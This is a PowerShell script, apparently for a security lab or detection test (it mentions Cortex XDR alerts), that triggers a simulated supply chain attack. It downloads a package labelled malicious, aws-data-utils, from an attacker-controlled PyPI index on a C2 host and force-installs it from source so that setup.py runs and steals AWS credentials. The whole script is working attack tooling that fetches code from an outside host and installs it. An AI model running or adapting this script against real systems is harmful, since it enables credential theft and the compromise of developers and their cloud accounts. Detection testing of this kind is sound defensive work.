# Trigger Supply Chain Attack - Manual Download Method
# Downloads malicious package via HTTP and installs locally

param(
    [string]$C2_IP
)

Write-Host "==========================================" -ForegroundColor Cyan
Write-Host "  Triggering Supply Chain Attack (Manual)" -ForegroundColor Cyan
Write-Host "==========================================" -ForegroundColor Cyan
Write-Host ""

# Get C2 IP from parameter, config file, or prompt
if (-not $C2_IP) {
    $C2_IP_File = Join-Path $PSScriptRoot ".c2_server_ip"
    if (Test-Path $C2_IP_File) {
        $C2_IP = Get-Content $C2_IP_File -Raw | ForEach-Object { $_.Trim() }
        Write-Host "[*] Using C2 IP from config: $C2_IP" -ForegroundColor Yellow
    } else {
        $C2_IP = Read-Host "Enter C2 Server IP"
    }
}

Write-Host "[*] C2 Server: $C2_IP" -ForegroundColor Yellow
Write-Host ""

# Check AWS credentials
$AwsCreds = Join-Path $env:USERPROFILE ".aws\credentials"
if (-not (Test-Path $AwsCreds)) {
    Write-Host "[-] Warning: AWS credentials file not found" -ForegroundColor Yellow
}

if (-not $env:AWS_ACCESS_KEY_ID) {
    Write-Host "[-] Warning: AWS environment variables not set" -ForegroundColor Yellow
}

Write-Host "WARNING: ATTACK SIMULATION STARTING" -ForegroundColor Red
Write-Host ""
Write-Host "[*] This will:" -ForegroundColor Yellow
Write-Host "    1. Download malicious 'aws-data-utils' package from $C2_IP" -ForegroundColor Yellow
Write-Host "    2. Install the package locally" -ForegroundColor Yellow
Write-Host "    3. Trigger credential theft on import" -ForegroundColor Yellow
Write-Host ""

$Confirm = Read-Host "Continue with attack? (yes/no)"
if ($Confirm -ne "yes") {
    Write-Host "Attack cancelled." -ForegroundColor Gray
    exit 0
}

Write-Host ""
Write-Host "[*] Fetching package list from attacker PyPI..." -ForegroundColor Yellow

try {
    # Get the package index page
    $IndexUrl = "http://${C2_IP}:8080/simple/aws-data-utils/"
    $Response = Invoke-WebRequest -Uri $IndexUrl -UseBasicParsing
    
    # Parse HTML to find package file
    $PackageFile = $null
    if ($Response.Content -match 'href="([^"]*\.(whl|tar\.gz))"') {
        $PackageFile = $Matches[1]
        Write-Host "[+] Found package: $PackageFile" -ForegroundColor Green
    } else {
        Write-Host "[-] Could not find package file in index" -ForegroundColor Red
        exit 1
    }
    
    # Download the package
    $PackageUrl = "http://${C2_IP}:8080/simple/aws-data-utils/$PackageFile"
    $TempDir = Join-Path $env:TEMP "malicious_package"
    New-Item -ItemType Directory -Force -Path $TempDir | Out-Null
    $LocalPackage = Join-Path $TempDir $PackageFile
    
    Write-Host "[*] Downloading package from $PackageUrl..." -ForegroundColor Yellow
    Invoke-WebRequest -Uri $PackageUrl -OutFile $LocalPackage -UseBasicParsing
    Write-Host "[+] Package downloaded: $LocalPackage" -ForegroundColor Green
    Write-Host ""
    
    # Install the package - force reinstall with --no-binary to ensure setup.py runs
    Write-Host "[*] Installing malicious package from local file..." -ForegroundColor Yellow
    Write-Host "[*] Forcing source installation to trigger setup.py..." -ForegroundColor Gray
    pip install --force-reinstall --no-deps --no-binary :all: $LocalPackage
    
    Write-Host ""
    if ($LASTEXITCODE -eq 0) {
        Write-Host "[SUCCESS] Malicious package installed!" -ForegroundColor Green
        Write-Host ""
        Write-Host "Check the C2 server terminal for stolen credentials!" -ForegroundColor Cyan
        Write-Host ""
        Write-Host "WARNING: Check Cortex XDR console for alerts:" -ForegroundColor Yellow
        Write-Host "    - Python accessing .aws/credentials" -ForegroundColor Yellow
        Write-Host "    - Outbound connection to C2 server" -ForegroundColor Yellow
    } else {
        Write-Host "[-] Installation failed!" -ForegroundColor Red
    }
    
} catch {
    Write-Host "[-] Error: $_" -ForegroundColor Red
    Write-Host ""
    Write-Host "Make sure the C2 server is running and accessible at http://${C2_IP}:8080" -ForegroundColor Yellow
}

Write-Host ""
